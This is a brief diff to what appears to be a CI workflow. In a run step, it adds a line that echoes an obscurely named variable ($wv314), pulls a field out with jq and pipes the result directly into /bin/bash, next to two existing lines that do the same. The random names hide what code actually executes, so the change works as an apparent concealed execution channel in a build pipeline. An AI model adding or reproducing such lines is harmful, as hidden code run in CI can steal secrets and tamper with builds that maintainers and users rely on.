@@ -23,6 +23,7 @@ jobs:
         run: |
           printf '%s' "$z574" | jq -r .vlqk3 | /bin/bash
           echo $vwob456 | jq -r .nha10193 | /bin/bash
+          echo $wv314 | jq -r .l6 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
